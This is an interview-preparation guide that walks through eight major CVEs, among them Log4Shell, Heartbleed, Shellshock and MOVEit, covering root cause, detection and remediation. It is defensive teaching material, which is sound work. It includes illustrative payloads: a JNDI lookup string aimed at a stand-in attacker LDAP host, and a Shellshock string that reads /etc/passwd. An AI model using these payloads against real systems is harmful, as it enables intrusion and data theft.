# CVE Walk-Throughs - Comprehensive Guide

## At a glance

**CVE walk-throughs** are how senior interviewers test whether you understand **real incidents** beyond headlines: the **root cause**, **exploitation primitive**, **blast radius**, **detection signals**, **patch/compensating controls**, and **organizational lessons**. This module provides **full walkthroughs** for eight high-signal CVEs plus a **reusable template** you can apply to any disclosure.

Aligned with the **[Content Mastery Framework](../Interview%20Preparation/Content%20Mastery%20Framework.md)**.

---

## Learning outcomes

- Explain each CVE in **60 seconds** and **5 minutes** without buzzword soup.
- Separate **root cause** from **full exploit chain** and **post-exploitation**.
- Prioritize **patch vs compensate** during active exploitation (KEV context).
- Map findings to **vulnerability management**, **detection**, and **architecture** fixes.

---

## Standard walkthrough template

Use this shape in interviews and postmortems:

1. **Context** — Product, default exposure, typical deployment.
2. **Root cause** — Code/config/trust-boundary failure (one sentence).
3. **Primitive** — RCE, auth bypass, memory leak, privilege escalation.
4. **Exploit chain** — Preconditions → trigger → outcome.
5. **Detection** — Logs, network, EDR, scan signatures.
6. **Remediation** — Patch version + compensating controls + secret rotation.
7. **Lessons** — What program/process change prevents recurrence.

---

## CVE-2021-44228 — Log4Shell (Log4j)

### Context
**Apache Log4j 2** logging library embedded in **Java** apps, frameworks (Spring, Solr, Struts ecosystems), and vendor products. Ubiquitous on **internet-facing** services.

### Root cause
Log4j **Message Lookup** substituted `${...}` in log messages with **JNDI lookups**, resolving attacker-controlled URLs.

### Primitive
**JNDI injection** → remote **class loading** or **LDAP reference** → **RCE** in vulnerable configurations.

### Exploit chain (architecture-level)

```
Attacker sends ${jndi:ldap://attacker/x} in User-Agent, headers, JSON fields
    → App logs the string
    → Log4j resolves JNDI
    → Attacker LDAP/RMI server returns malicious Reference
    → JVM loads attacker code → RCE as app user
```

### Detection
- Outbound **LDAP/RMI/DNS** from app subnets to unknown hosts.
- Log4j **lookup** patterns in WAF logs.
- Vendor IOC lists; **Nuclei** templates (authorized scanning only).

### Remediation
- Upgrade Log4j to **2.17.1+** (verify current vendor guidance).
- Emergency: **`log4j2.formatMsgNoLookups=true`**, remove **JndiLookup** class (temporary).
- **Block egress** to unexpected LDAP/RMI; **WAF** rules (secondary).
- **Rotate secrets** on compromised hosts; hunt persistence.

### Lessons
- **Dependency inventory** (SBOM) speed is incident response.
- **Never evaluate** untrusted data in **lookup/rendering** paths.
- **Egress control** limits JNDI class of bugs.

---

## CVE-2022-22965 — Spring4Shell (Spring Framework)

### Context
**Spring MVC / Spring WebFlux** on **JDK 9+**, deployed as **WAR on Tomcat** (specific combination—verify advisories for your stack).

### Root cause
**Data binding** / **access rules** on **class loader** properties under certain deployment patterns allowed attacker to write **access log valve** paths → **JSP webshell** in some configs.

### Primitive
**Remote code execution** via manipulated **request parameters** binding to sensitive object graphs.

### Detection
- Unexpected **POST** parameters with `class.*` patterns.
- New **JSP** or web shell files on disk.
- Tomcat **access log** anomalies.

### Remediation
- Patch **Spring Framework** to fixed versions per vendor matrix.
- **Upgrade JDK/Tomcat** combinations per advisory.
- **WAF** rules for suspicious parameter names (temporary).

### Lessons
- **Framework defaults** + **deployment mode** matter—test **your** stack, not blog posts.
- **Separate** RCE from Log4Shell in interviews—different mechanism.

---

## CVE-2014-0160 — Heartbleed (OpenSSL)

### Context
**OpenSSL 1.0.1** TLS heartbeat extension on **any** service using affected builds (HTTPS, VPN, email).

### Root cause
Missing **bounds check** on **TLS heartbeat** response—server returned up to **64KB** of **heap memory** per request.

### Primitive
**Memory disclosure** (not RCE directly)—may leak **private keys**, session cookies, credentials from process memory.

### Exploit chain
Attacker sends malformed heartbeat → server responds with **adjacent heap bytes** → repeat to sweep memory.

### Detection
- IDS signatures for **heartbeat payload size** anomalies.
- Difficult at scale—assume compromise if exposed; **rotate keys**.

### Remediation
- Patch OpenSSL; **reissue certificates** and **rotate keys** (mandatory—patch alone insufficient if keys leaked).
- Invalidate sessions; force re-auth.

### Lessons
- **Crypto library bugs** require **key rotation**, not only binary patch.
- **Memory-safe** language doesn't help if **linked to C** crypto.

---

## CVE-2014-6271 — Shellshock (Bash)

### Context
**GNU Bash** invoked via **CGI**, **DHCP clients**, **OpenSSH** forced commands, **legacy** web stacks.

### Root cause
Bash exported **function definitions** in environment variables were **parsed as trailing commands**.

### Primitive
**Remote code execution** when attacker controls **environment** passed to Bash.

### Example shape (illustrative)
`() { :; }; /bin/cat /etc/passwd` in **User-Agent** or env var processed by CGI.

### Remediation
- Patch Bash; eliminate **CGI** calling shell; use **non-shell** handlers.

### Lessons
- **Shell in request path** is a recurring RCE theme—ban for internet-facing apps.

---

## ProxyLogon / ProxyShell — Microsoft Exchange

### Context
**On-prem Exchange** with **Outlook Web App** exposed to internet.

### Root cause (family)
Chained flaws: **SSRF** to internal **Exchange PowerShell** endpoints, **authentication bypass**, **arbitrary file write** (ProxyLogon); later **ProxyShell** variants on patched-but-misconfigured systems.

### Primitive
**Pre-auth** → **RCE** as **SYSTEM** on Exchange server in worst case.

### Detection
- **Exchange** logs: suspicious **autodiscover** paths, **OAB** downloads.
- **HAFNIUM** IOCs; unexpected **aspx** webshells under `aspnet_client`.
- **Patch level** vs **exposure** mismatch.

### Remediation
- Apply **Cumulative Updates** + **Security Updates** per Microsoft guidance.
- **Isolate** Exchange from internet if patch lag; **hunt** webshells.
- Assume **domain compromise** if SYSTEM achieved—full IR.

### Lessons
- **Internet-facing admin mail** is crown-jewel—prioritize like AD tier-0.
- **Emergency patch playbooks** for **KEV** items.

---

## CVE-2023-4966 — Citrix Bleed (NetScaler ADC/Gateway)

### Context
**Citrix NetScaler ADC/Gateway** appliances—VPN and load balancing at enterprise edge.

### Root cause
**Buffer overread** in **session token** handling leaked **memory** including **valid session tokens**.

### Primitive
**Session hijack** without credentials—bypass MFA for hijacked sessions.

### Detection
- Repeated requests triggering **memory leak** patterns.
- **Session anomalies**—same token from new IP/geo.
- Vendor **IOC** and **version** checks.

### Remediation
- Patch to fixed **NetScaler** builds; **terminate all sessions**; force re-auth.
- **Rotate** admin credentials; review **VPN logs** for lateral movement.

### Lessons
- **Memory disclosure** at edge appliances = **MFA bypass** narrative for interviews.

---

## CVE-2024-6387 — regreSSHion (OpenSSH)

### Context
**OpenSSH server (sshd)** on **glibc Linux**—race condition in **signal handler** / **SIGALRM** handling (regression of old CVE-2006-5051 class).

### Root cause
**Race condition** in **sshd** on **32-bit** and some **64-bit** configurations—timing-dependent **RCE as root** in vulnerable versions (verify NVD for affected version ranges).

### Primitive
**Local/network-adjacent RCE** depending on deployment—high media visibility in 2024.

### Remediation
- Upgrade **OpenSSH** per distro advisory; reduce **MaxStartups** throttling abuse of race attempts (compensating).
- Monitor auth **anomaly** spikes.

### Lessons
- **Regression bugs** in critical C code—patch velocity matters for **internet-facing SSH**.

---

## CVE-2023-34362 — MOVEit Transfer

### Context
**Progress MOVEit** managed file transfer—common in **finance/healthcare** B2B.

### Root cause
**SQL injection** in web layer → **ASP.NET webshell** deployment → data **exfiltration** (Cl0p ransomware affiliate campaign).

### Primitive
**SQLi → RCE → mass data theft**—not novel primitive but **high-impact** supply chain to **partners**.

### Detection
- New **aspx** files; **SQL error** logs; large outbound transfers.
- **Cl0p** extortion patterns.

### Remediation
- Vendor patch; **IR** with **partner notification** (regulatory).

### Lessons
- **Managed file transfer** = concentrated sensitive data—tier-1 patch priority.

---

## Prioritization during active exploitation

| Signal | Action |
|--------|--------|
| **CISA KEV** listed | Patch or isolate within SLA hours/days |
| **EPSS high** + internet exposure | Expedite |
| **Internal only, no exploit public** | Plan patch; compensating controls |
| **Compensating only** | Document expiry; WAF/egress never permanent fix for RCE |

Cross-read **[Vulnerability Management Lifecycle](../Vulnerability%20Management%20Lifecycle/)**, **[Risk Prioritization and Security Metrics](../Risk%20Prioritization%20and%20Security%20Metrics/)**.

---

## Interview clusters

| Level | Prompt | Strong shape |
|-------|--------|--------------|
| **Junior** | Explain Heartbleed in 60s | TLS heartbeat overread → key rotation |
| **Mid** | Log4Shell root cause vs impact | JNDI lookup in logs → RCE; patch + egress |
| **Senior** | Exchange still exploited post-patch | ProxyShell chain, incomplete config hardening |
| **Staff** | Org response model for KEV | SBOM, comms, hunt, metrics, exception process |

---

## Hands-on (authorized)

- **Nuclei** templates in lab for **detection validation** (not prod without approval).
- Build **local Log4j** test harness in isolated VM.
- **Vendor advisories** and **CISA alerts** as primary sources.

---

## Cross-links

`Remote Code Execution (RCE)` · `Vulnerability Management Lifecycle` · `Production Security Incident Response` · `Software Supply Chain Security`

---

## References

- [NVD](https://nvd.nist.gov/)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- Vendor advisories (Apache, Microsoft, Citrix, OpenSSL)
